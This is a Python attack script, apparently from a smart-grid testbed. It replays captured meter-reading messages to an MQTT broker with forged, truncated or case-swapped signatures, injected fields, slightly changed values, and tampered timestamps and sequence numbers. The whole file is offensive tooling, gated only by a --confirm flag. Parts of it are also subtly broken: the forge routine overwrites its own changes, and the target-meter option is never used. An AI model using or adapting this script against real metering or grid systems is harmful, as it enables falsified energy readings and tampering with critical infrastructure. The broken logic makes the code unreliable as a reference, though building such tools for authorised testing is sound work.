#!/usr/bin/env python3
"""
Signature Bypass Attacker - Exploits signature verification weaknesses and edge cases
"""

import os
import json
import time
import argparse
import random
import hashlib
from typing import List, Dict, Any
import paho.mqtt.client as mqtt
from eth_account import Account
from eth_account.messages import encode_defunct

# Config
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))

class SignatureBypassAttacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = self.load_captures()
        self.client = mqtt.Client(client_id="sig_bypass_attacker")
        
    def load_captures(self) -> List[Dict[str, Any]]:
        if not os.path.exists(CAPTURE_FILE):
            return []
        with open(CAPTURE_FILE, "r") as f:
            return json.load(f)
    
    def canonical_json_exploit(self, payload: dict) -> str:
        """Exploit canonical JSON generation differences"""
        # Try different JSON serialization methods to find inconsistencies
        methods = [
            lambda x: json.dumps(x, separators=(",", ":"), sort_keys=True),
            lambda x: json.dumps(x, separators=(",", ":"), sort_keys=False),
            lambda x: json.dumps(x, separators=(", ", ": "), sort_keys=True),
            lambda x: json.dumps(x, separators=(", ", ": "), sort_keys=False),
        ]
        
        for method in methods:
            try:
                return method(payload)
            except:
                continue
        return json.dumps(payload, separators=(",", ":"), sort_keys=True)
    
    def signature_replay_attack(self, original_payload: dict, target_meter: str = None):
        """Replay signature from one meter to another"""
        if not target_meter:
            target_meter = original_payload.get("meterID")
        
        # Create new payload with different meter but same signature
        new_payload = original_payload.copy()
        new_payload["meterID"] = target_meter
        new_payload["ts"] = int(time.time())
        
        # Try to exploit signature verification
        return new_payload
    
    def signature_forge_attack(self, payload: dict):
        """Attempt to forge signatures using various techniques"""
        # Method 1: Signature truncation
        original_sig = payload.get("signature", "")
        if len(original_sig) > 2:
            truncated_sig = original_sig[:len(original_sig)//2] + "0" * (len(original_sig) - len(original_sig)//2)
            payload["signature"] = truncated_sig
        
        # Method 2: Signature padding
        if original_sig.startswith("0x"):
            padded_sig = original_sig + "00" * 10
            payload["signature"] = padded_sig
        
        # Method 3: Case manipulation
        payload["signature"] = original_sig.swapcase()
        
        return payload
    
    def payload_injection_attack(self, payload: dict):
        """Inject malicious data while preserving signature structure"""
        # Add extra fields that might not be validated
        payload["extra_field"] = "malicious_data"
        payload["injection"] = {"nested": "attack"}
        
        # Modify existing fields subtly
        if "value" in payload:
            payload["value"] = payload["value"] * 1.0001  # Tiny modification
        
        return payload
    
    def timestamp_manipulation_attack(self, payload: dict):
        """Manipulate timestamps to bypass time-based validation"""
        current_time = int(time.time())
        
        # Try different timestamp strategies
        strategies = [
            current_time - 1,  # 1 second ago
            current_time + 1,  # 1 second future
            current_time - 60,  # 1 minute ago
            current_time + 60,  # 1 minute future
            0,  # Epoch
            2**31 - 1,  # Max 32-bit timestamp
        ]
        
        payload["ts"] = random.choice(strategies)
        return payload
    
    def sequence_manipulation_attack(self, payload: dict, last_seq: int = 0):
        """Manipulate sequence numbers to bypass sequence validation"""
        strategies = [
            last_seq,  # Same sequence
            last_seq - 1,  # Previous sequence
            last_seq + 100,  # Large gap
            0,  # Reset sequence
            -1,  # Negative sequence
        ]
        
        payload["seq"] = random.choice(strategies)
        return payload
    
    def publish_attack(self, payload: dict, target_topic: str = None):
        """Publish the attack payload"""
        client = mqtt.Client(client_id=f"sig_bypass_{int(time.time()*1000)}")
        client.connect(self.broker, self.port, 60)
        client.loop_start()
        
        topic = target_topic or self.topic
        payload_str = json.dumps(payload, separators=(",", ":"), sort_keys=False)
        client.publish(topic, payload_str)
        
        time.sleep(0.2)
        client.loop_stop()
        client.disconnect()
        
        print(f"[SIG_BYPASS] Published attack: meter={payload.get('meterID')} seq={payload.get('seq')}")
    
    def run_signature_bypass_attacks(self, attack_type: str = "all", target_meter: str = None):
        """Run various signature bypass attacks"""
        if not self.captures:
            print("No captures available for signature bypass attacks")
            return
        
        # Select random capture for testing
        target_capture = random.choice(self.captures)
        original_payload = target_capture["payload"].copy()
        
        attacks = {
            "replay": self.signature_replay_attack,
            "forge": self.signature_forge_attack,
            "injection": self.payload_injection_attack,
            "timestamp": self.timestamp_manipulation_attack,
            "sequence": self.sequence_manipulation_attack,
        }
        
        if attack_type == "all":
            for attack_name, attack_func in attacks.items():
                print(f"[SIG_BYPASS] Running {attack_name} attack...")
                modified_payload = attack_func(original_payload.copy())
                self.publish_attack(modified_payload)
                time.sleep(1)
        elif attack_type in attacks:
            print(f"[SIG_BYPASS] Running {attack_type} attack...")
            modified_payload = attacks[attack_type](original_payload.copy())
            self.publish_attack(modified_payload)

def main():
    parser = argparse.ArgumentParser(description="Signature Bypass Attacker")
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--topic", default=DEFAULT_TOPIC)
    parser.add_argument("--attack", choices=["replay", "forge", "injection", "timestamp", "sequence", "all"], 
                       default="all", help="Type of signature bypass attack")
    parser.add_argument("--target-meter", help="Target meter ID for attacks")
    parser.add_argument("--confirm", action="store_true", help="Required to execute attacks")
    
    args = parser.parse_args()
    
    if not args.confirm:
        print("Signature bypass attacks require --confirm")
        return
    
    attacker = SignatureBypassAttacker(args.broker, args.port, args.topic)
    attacker.run_signature_bypass_attacks(args.attack, args.target_meter)

if __name__ == "__main__":
    main()